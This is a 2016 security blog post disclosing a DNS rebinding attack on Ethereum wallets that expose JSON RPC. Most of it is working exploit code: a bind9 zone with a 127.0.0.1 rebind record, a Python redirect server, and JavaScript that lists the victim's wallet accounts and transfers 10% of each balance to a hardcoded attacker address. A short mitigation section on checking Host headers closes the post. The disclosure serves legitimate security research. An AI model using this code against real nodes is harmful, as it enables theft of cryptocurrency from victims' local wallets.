!!!
ethereum-wallet-exploit
July 6, 2016
Walking Past Same-origin Policy, NAT, and Firewall for Ethereum Wallet Control
This vulnerability was originally reported to the Etherum Bug Bounty on June 12th, 2016. At the core of this attack is a "DNS Rebinding" vulnerability, in this post I explain the vulnerability, suggest an exploit, and leave you with a complete proof-of-concept solution.
<!--no banner-->
!!!


This vulnerability was originally reported to the Etherum Bug Bounty on June 12th, 2016.

## DNS Rebinding
At the core of this attack is a "DNS Rebinding" vulnerability, I remember learning about this years ago from [RSnake](https://twitter.com/rsnake) on either [ha.ckers.org](https://web.archive.org/web/*/ha.ckers.org) or [xssed.com](http://www.xssed.com). A copy of RSnake's original DNS Rebinding exlpainer video can be found [here](https://www.youtube.com/watch?v=FIQGKIE3Fv0). For those already familiar with the concepts of [DNS](https://en.wikipedia.org/wiki/Domain_Name_System) and [Same-origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) the explanation for malicious domain `scam.rhodey.org` is pretty simple:

1. Publish two DNS A Records, one with the legitimate IP address, the other with `127.0.0.1`
2. Direct a victim to visit `http://scam.rhodey.org`
3. Serve some JavaScript *(scam.js)* from `scam.rhodey.org`
4. After serving, blackhole the victim's IP address using iptables
5. All AJAX requests to `scam.rhodey.org` from *scam.js* now hit `127.0.0.1`

DNS Rebinding attacks are so bizarre because all the hostile traffic you'd usually mitigate through NAT or firewall is coming from **inside the network**, and in this case the victim machine is actually attacking itself! This attack makes it past same-origin policy because same-origin works on domain names not IP addresses.

## The Attack
Ethereum nodes and wallets have standardized on [JSON RPC](https://eth.wiki/json-rpc/API), this is what we'll be attacking. Enabling RPC is a prerequisite for using many "DAPPS" (Decentralized Applications) and [Mist Browser](https://github.com/ethereum/mist) (now deprecated) used to enable RPC by default.

## Nameserver Configuration
The nameserver I'm using is [bind9](https://wiki.debian.org/Bind9) and the malicious domain will be `scam.rhodey.org`. It is crucial that the legitimate IP address of `scam.rhodey.org` be served before `127.0.0.1`, to do this you must compile bind9 from source with the `--enable-fixed-rrset` option and set `rrset-order` in your configuration.

```
### /etc/bind/named.conf.options
options {
  directory "/var/cache/bind";
  dnssec-validation auto;
  auth-nxdomain no;
  listen-on-v6 { any; };
  recursion no;
  allow-transfer { none; };
  rrset-order { order fixed; };
};

### /etc/bind/zones/db.rhodey.org
$TTL 1800 
@ IN SOA ns1.rhodey.org. rhodey.anhonesteffort.org. (
  2016061209 ; Serial
  1800       ; Refresh
  180        ; Retry
  2419200    ; Expire
  1800 )     ; Negative Cache TTL

; Name servers
rhodey.org.    IN    NS    ns1.rhodey.org.
rhodey.org.    IN    NS    ns2.rhodey.org.

; Name server A records
ns1    IN    A    173.255.255.43
ns2    IN    A    173.255.255.43

; Other A records
@     IN    A    173.255.255.43
scam  IN    A    173.255.255.43
scam  IN    A    127.0.0.1
```

## Pretty Lil' Redirect
By convention Ethereum JSON RPC uses TCP port `8545` which means to satisfy same-origin policy we'll need to serve the exploit from `8545` as well, but `http://scam.rhodey.org:8545` looks hella shady so we use a [HTTP 307 Redirect](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307) to bounce `http://rhodey.org` to `http://scam.rhodey.org:8545`.

```python
import BaseHTTPServer
import time

OUR_HOST  = "rhodey.org"
OUR_PORT  = 80
NEXT_HOST = "scam.rhodey.org"
NEXT_PORT = "8545"
REDIRECT  = "http://" + NEXT_HOST + ":" + NEXT_PORT

class RedirectHandler(BaseHTTPServer.BaseHTTPRequestHandler):
  def do_HEAD(s):
    s.send_response(307)
    s.send_header("Location", REDIRECT)
    s.end_headers()
  def do_GET(s):
    s.do_HEAD()

if __name__ == '__main__':
  server_class = BaseHTTPServer.HTTPServer
  httpd        = server_class((OUR_HOST, OUR_PORT), RedirectHandler)
  print time.asctime(), "Server Starts - %s:%s" % (OUR_HOST, OUR_PORT)
  try:
    httpd.serve_forever()
  except KeyboardInterrupt:
    pass
  httpd.server_close()
  print time.asctime(), "Server Stops - %s:%s" % (OUR_HOST, OUR_PORT)
```

## The HTML
After redirecting the victim to malicious domain we serve some very basic HTML.

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>taker</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
  </head>
  <body>
    <div id="logDiv"></div>
    <script src="scam.js"></script>
  </body>
</html>
```

## The JavaScript
The JavaScript does a few things:

1. send a HTTP GET request to `http://scam.rhodey.org/goodbye`, triggering the iptables blackhole.
2. retrieve a list of Ethereum wallets via wallet RPC.
3. send `%10` of each wallets balance to my Ethereum wallet.

Between step 1 and 2 the victim's IP address has been blackholed by iptables such that the browser receives [TCP close with RST flag](https://stackoverflow.com/questions/13049828/fin-vs-rst-in-tcp-connections), this causes the browser to move onto the next record for `scam.rhodey.org` which is `127.0.0.1`... rebind complete! Communication between JavaScript and the Ethereum JSON API is made possible by the Ethereum [web3.js](https://web3js.readthedocs.io) library.

```javascript
var BigNumber    = require('big-number');
var DEST_ADDRESS = "0xbd9864678B27C1932831D462ABFF9471f2f8Dd3c";
var web3         = null;
var logHtml      = "";

function log(msg) {
  var logDiv = document.getElementById("logDiv");
  logHtml += ("<br/>" + msg);
  logDiv.innerHTML = logHtml;
}

function getHref() {
  var parts = window.location.href.split("/");
  return parts[0] + "//" + parts[2];
}

function initW3() {
  log("initializing w3...");
  var Web3 = require('web3');
  web3 = new Web3();
  web3.setProvider(new web3.providers.HttpProvider(getHref()));
}

function takeEthFrom(address) {
  log("getting balance for account " + address + "...");
  var balanceWei = web3.eth.getBalance(address);
  var takeWei = balanceWei.div(10);
  var txn = {
    from  : address,
    to    : DEST_ADDRESS,
    value : takeWei
  };

  log("sending transaction -> " + JSON.stringify(txn, null, 2));
  web3.eth.sendTransaction(txn, function(err, result) {
    if (!err) {
      log("transaction succeeded with result -> " + result);
    } else {
      log("transaction failed with error -> " + err);
    }
  });
}

function takeEth() {
  log("getting account list...");
  var accounts = web3.eth.accounts;
  for (var i = 0; i < accounts.length; i++) {
    takeEthFrom(accounts[i]);
  }
}

function sayGoodbye() {
  log("rebinding dns...");
  $.ajax({
    type: 'GET',
    url: '/goodbye',
    success: function(data, status, xhr) {
      initW3();
      takeEth();
    },
    error: function (data, status, error) {
      log("xhr /goodbye failed, status -> " + status + " error -> " + error);
    }
  });
}

sayGoodbye();
```

## Mitigation
Mitigating DNS Rebinding vulnerabilities is very simple: **always check HTTP Host headers**. The malicious HTTP requests that reach the victim wallet have a [HTTP Host Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Host) of `scam.rhodey.org` which should be checked against `localhost` and/or a whitelist. In June 2016 the most popular Ethereum implementation [go-ethereum](https://github.com/ethereum/go-ethereum) did not check host headers.

## Proof-of-Concept Source
Everything you need to perform this attack can be found [here in my Github repo](https://github.com/rhodey/eth-rebind).
